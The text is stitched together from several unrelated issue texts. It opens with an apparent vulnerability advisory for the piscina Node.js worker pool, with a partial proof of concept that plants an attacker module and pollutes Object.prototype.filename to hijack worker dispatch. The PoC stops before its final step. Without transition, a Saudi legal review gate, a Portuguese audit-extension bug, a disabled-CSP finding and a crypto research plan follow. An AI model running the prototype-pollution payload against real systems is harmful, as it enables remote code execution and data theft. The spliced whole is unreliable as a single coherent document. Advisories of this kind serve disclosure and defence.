CVE: 2026-55388 found in piscina - Version: 3.1.0 [JS]

Veracode Software Composition Analysis  
===============================
  
 Attribute | Details  
| --- | --- |  
Library | piscina  
Description | A fast, efficient Node.js Worker Thread Pool implementation  
Language | JS  
Vulnerability | Piscina: Prototype Pollution Gadget → RCE Via Inherited Options.filename  
Vulnerability description | Summary
"piscina"'s constructor and "run()" paths read the "filename" option via plain member access:
// dist/index.js line 92 (constructor)
const filename = options.filename
  ? (0, common_1.maybeFileURLToPath)(options.filename)
  : null;
this.options = { ...kDefaultOptions, ...options, filename, maxQueue: 0 };

// dist/index.js line 616 (run())
run(task, options = kDefaultRunOptions) {
    if (options === null || typeof options !== 'object') {
        return Promise.reject(new TypeError('options must be an object'));
    }
    const { transferList, filename, name, signal } = options;
Both reads fall through the prototype chain when the caller's options object doesn't have "filename" as an own property. When "Object.prototype.filename" is polluted upstream — by any of the well-documented PP-source CVEs (lodash<4.17.13, qs<6.10.3, set-value<4.1.0, minimist<1.2.6, deepmerge<4.2.2, and others) — the inherited value flows to "worker_threads.Worker" import and the attacker's ".mjs" runs in the worker.
Subtlety: calling "pool.run(task)" with no second arg uses "kDefaultRunOptions" which has "filename: null" as an OWN property — that path DOES NOT fire. The vulnerable shape is when the caller passes their own options object (commonly "{signal: ac.signal}" for abort support, "{name: ...}" for task labelling, etc.). These caller-built options objects inherit from "Object.prototype" unless the caller explicitly uses "Object.create(null)".
Impact
Two preconditions:
1. Upstream PP-source somewhere in the process — common in transitive deps
2. Attacker-controllable ".mjs" at a known filesystem path — realistic via upload endpoints, /tmp races, predictable node_modules paths, or supply-chain
Once both fire:
- Every "pool.run(task, opts)" call across the entire process is hijacked
- Attacker's exported function is called with the legitimate caller's task data — attacker reads per-request app data
- Attacker controls the return value — caller receives "worker_response.by = "ATTACKER-WORKER"" and any other attacker-supplied response fields — attacker can poison return values to legitimate clients
- Hijack persists until process restart
Strictly worse than the analogous pino chain because piscina actually invokes the attacker function with caller data on every dispatch (pino imports the attacker module once and errors out).
Affected versions
Empirically verified vulnerable on "piscina@5.1.4" (latest stable at time of disclosure). The bug shape is in the constructor's "options.filename" read at line 92 of "dist/index.js", present since the worker-pool API stabilized — likely all 3.x / 4.x / 5.x affected.
Proof of concept
A) Minimal in-process PoC
import fs from 'fs';

// 1) Drop the attacker module (any path the victim process can read)
fs.writeFileSync('/tmp/atk.mjs', `
  import fs from 'fs';
  fs.writeFileSync('/tmp/PISCINA_RCE_SENTINEL', JSON.stringify({
    rce: 'CONFIRMED', pid: process.pid, argv1: process.argv[1],
  }));
  export default function(arg) { return 'attacker-return-' + JSON.stringify(arg); }
`);

// 2) Upstream PP-source — pollute Object.prototype.filename
//    (representative of CVE-2019-10744 lodash<4.17.13, CVE-2022-24999 qs<6.10.3,
//     and ~30 historical PP-source CVEs)
const payload = JSON.parse('{"__proto__":{"filename":"/tmp/atk.mjs"}}');
function vulnMerge(t, s) {
  for (const k of Object.keys(s)) {
    if (s[k] !== null && typeof s[k] === 'object') {
      if (!t[k]) t[k] = {};
      vulnMerge(t[k], s[k]);
    } else t[k] = s[k];
  }
}
vulnMerge({}, payload);

Saudi legal / regulatory + PDPL external review gate — engineering guardrails complete

## Purpose
This issue is the **external legal/regulatory/privacy launch gate** for STARTAK Real Estate. The software engineering guardrails for unlicensed decision support are implemented; this issue remains open because automated tests cannot establish Saudi legal applicability, licensing status, professional authority or PDPL legal compliance.

## Engineering state — completed
The engineering portion was implemented and production-verified through PR #122 / Wave 5. Controls include:
- `UNLICENSED_DECISION_SUPPORT` boundary;
- blocked customer-facing `BUY / SELL / APPROVE / REJECT` and regulated-service claims;
- non-certified valuation semantics;
- fail-closed legal/title interpretation boundary;
- persistent Arabic/English scope notices;
- source-bound regulatory metadata and freshness controls;
- PDPL engineering evidence controls;
- export/saved-deal compliance provenance;
- production Compliance Guard verification.

This engineering PASS is not a legal opinion and does not close this issue.

## Subsequent decision-integrity hardening relevant to external review
The current engineering lineage also includes or proposes the following bounded controls:
- P24 / PR #459: replacement-cost indication is explicitly not an accredited appraisal or market-value determination — **merged**;
- P25 / PR #461: critical V2 assumption overrides require explicit source and approval evidence for decision readiness; incomplete documentation is fail-closed while analytical numbers remain visible — **technically qualified, unmerged**;
- P26 / PR #462: annual project/equity timing versus monthly construction-financing timing is disclosed explicitly — **technically qualified, unmerged**;
- P27 / PR #463: versioned current-model validation corpus is separated from historical RE-GOLD evidence — **technically qualified, unmerged**.

None of P25–P27 is treated as production/current-law evidence until separately reviewed and merged under valid authority.

## Required external review record
Closure requires a dated, attributable written record from qualified Saudi legal/regulatory/privacy reviewers covering at minimum:

1. **Operating classification** — whether the intended internal/customer-facing scope remains decision support or crosses into regulated real-estate consultancy/analysis, brokerage, accredited valuation, investment advice, legal advice or transaction facilitation.
2. **Licences / permissions** — required REGA, Taqeem, CMA or other professional/commercial permissions for the intended operating model.
3. **Permitted product language** — approval or required amendment of Arabic/English disclaimers, analytical-indication terminology, recommendation labels, valuation wording and legal/title boundary text.
4. **Licensed-professional gates** — when legal review, accredited valuer review, regulated consultancy review or other licensed intervention is mandatory, and what evidence must be retained.
5. **PDPL posture** — controller/processor roles; lawful purpose/basis; data minimisation; retention/deletion; access controls; data-subject rights; processor terms; breach response; cross-border transfers; DPIA/ROPA/DPO requirements where applicable.
6. **Critical-override evidence handling** — whether P25 source/approver/reference fields contain personal/confidential data requiring additional retention, access, masking or purpose controls.
7. **Commercial launch conditions** — explicit conditions precedent, restricted features and prohibited operating modes before external commercial launch.
8. **Transaction boundary** — confirm prohibited brokerage/negotiation/commission/funds/contract-execution activities unless separately authorized.
9. **Residual remediation** — any required code, UX, privacy notice, terms, contracts, security/data-governance or operating-process changes.

## Evidence quality required
The review artifact should retain:
- reviewer/counsel iden

Bug: AUD concluída não permite complementar catálogos não solicitados

## Contexto

Detectado no smoke da #74 com a AUD `AUD-74C2F2DEA4D7449EB00AFAAA7E4C209E`.

O operador selecionou somente:
- CAT-06 · Apdex de navegação
- CAT-07 · Apdex de experiência

A execução foi **sem IA**. O contrato original ficou corretamente:
- `audit_mode=NO_AI`
- `semantic_provider=NONE`
- fulfillment `7/7 SUCCESS`
- `processing_status=COMPLETE`
- `score_status=FINAL`
- `report_status=FINAL`

Portanto não existe pendência de IA e o estado COMPLETE é correto para o escopo original.

### Problema

A regra implementada na #61 esconde reprocessamento para qualquer AUD `COMPLETE`. Isso é correto para **repetir pendências inexistentes**, mas impede um caso distinto: adicionar posteriormente um CAT-* que nunca integrou o contrato daquela AUD.

Hoje o operador só consegue carregar a configuração e criar um **novo AUD**, mesmo quando:
- a mesma AUD ainda está dentro da janela temporal de recuperação live;
- os dados-base persistidos são suficientes para catálogos replay-safe;
- o motor de RPR já sabe executar seletivamente os componentes correspondentes.

## Comportamento esperado

Separar duas operações:

1. **Reprocessar pendências**
   - continua indisponível quando o contrato vigente está COMPLETE;
   - nunca repete sucessos.

2. **Complementar auditoria**
   - disponível quando existem CAT-* ainda não solicitados e a AUD possui configuração canônica reutilizável;
   - somente aditiva: não remove catálogo já materializado;
   - registra o delta como extensão posterior vinculada a RPR, sem reescrever o snapshot original;
   - reutiliza o mesmo motor seletivo de processamento/reprocessamento;
   - catálogos live só podem ser acrescentados enquanto a janela temporal da AUD estiver válida;
   - catálogos replay-safe podem usar evidência persistida;
   - se CAT-08 for acrescentado sem IA, passa a existir pendência explícita; ausência de IA em AUD que nunca solicitou CAT-08 não é pendência;
   - ao finalizar, report-catalog deve projetar plano original + extensões aditivas materializadas, com proveniência temporal.

## Integridade

- não alterar o plano original salvo em `audit_execution_configurations`;
- não falsificar que novos CAT-* pertenciam à execução inicial;
- não recolher novamente CAT-06/CAT-07 já SUCCESS;
- não alterar fórmulas de Apdex/SARI/SCORE-GEO;
- manter RPR e processamento usando runtimes canônicos;
- preservar configuração, secrets e política SaaS existentes;
- registrar extensão/horário/RPR e configuração não secreta necessária.

## Relações

- evolui a UX da #61 sem reabrir seu bug original;
- depende da infraestrutura #66 de paridade processamento/reprocessamento;
- detectado durante smoke da #74/#75.

Security: Content-Security-Policy is explicitly disabled in Helmet config

## Summary

The Helmet middleware is registered with `contentSecurityPolicy: false`, disabling CSP entirely. Without CSP, any XSS that reaches the browser has no second line of defence.

## Affected File

- `src/api.ts` (~line 76–78)

## Vulnerable Code

```typescript
api.register(helmet, {
  contentSecurityPolicy: false, // CSP managed per-deployment
});
```

## Recommendation

Enable a baseline CSP. For a JSON API server the policy can be strict since no HTML is served:

```typescript
api.register(helmet, {
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'none'"],
      frameAncestors: ["'none'"],
    },
  },
});
```

If the Swagger UI endpoint (`/api/docs`) requires relaxed directives, apply a route-level override only for that path.

## Severity

**Medium** — Weakens XSS defence-in-depth; no direct exploitability on a pure API server, but required for baseline hardening.

---
*Found by automated security audit.*

2x Factory Cohort 001: matched-control precursors + trusted prospective candidates

Parent: #505
Depends on: #506

## Objective
Launch the first end-to-end authentic <=90-day 2x research cohort immediately after #506 has a trusted non-backdateable formation boundary. Combine historical point-in-time matched-control research with current prospective candidate formation.

## Historical rare-event lane
Build/extend the largest scientifically defensible set of genuine liquid 2x+ <=90-day events available under current data. Do not weaken PIT/coverage rules to hit a sample-count target.

For each event:
- freeze event start and information cutoff;
- reconstruct only evidence genuinely available at that time;
- select outcome-blind matched non-winners using pre-event covariates;
- preserve censored/incomplete cases separately;
- store provenance and immutable dataset identities.

## Precursor feature families
Evaluate only timestamp-defensible features, including where available:
- float / circulating supply / unlocks / issuance;
- market cap, ADV, spread, depth and liquidity;
- spot-led volume and relative-strength acceleration;
- OI, funding, basis, liquidations and deleveraging;
- exchange / wallet / on-chain flows;
- treasury/ETF/capital flows where applicable;
- fundamentals, usage, revenue, developer/activity acceleration;
- catalysts and narrative acceleration;
- regime, correlation and peer effects.

Separate FACT / INFERENCE / HYPOTHESIS / UNKNOWN.

## Candidate system
Use a broad candidate-retrieval stage followed by a stricter precision ranker. Measure rare-event metrics such as precision@K, recall@K, PR-AUC and lift over matched/base rates when statistically defensible. Do not optimize ordinary accuracy.

## Prospective formation
A current candidate counts only when:
- full evidence is PIT;
- reference price/time is trusted;
- <=90d target/horizon and invalidation are frozen;
- formation is persisted through the trusted non-backdateable receipt/store introduced by the repaired #506;
- evidence-for and evidence-against are both frozen before outcome observation.

Never require a minimum number of live candidates. Zero candidates is valid when nothing clears the threshold.

## Resolution
Resolve HIT / INVALIDATED / EXPIRED without rewriting formation history. Preserve misses and false positives for learning.

## Acceptance
1. Historical events and matched controls are reproducible and PIT-safe.
2. At least one precursor hypothesis is tested against matched controls; if none is valid, record the blocker rather than invent one.
3. The first current candidate(s), if any, are immutably formed before the move using trusted persistence.
4. Already-moved assets cannot be backfilled as successful predictions.
5. Candidate ranking is evaluated with rare-event metrics and tradability, not raw accuracy.
6. Outcomes feed learning without rewriting prior evidence.
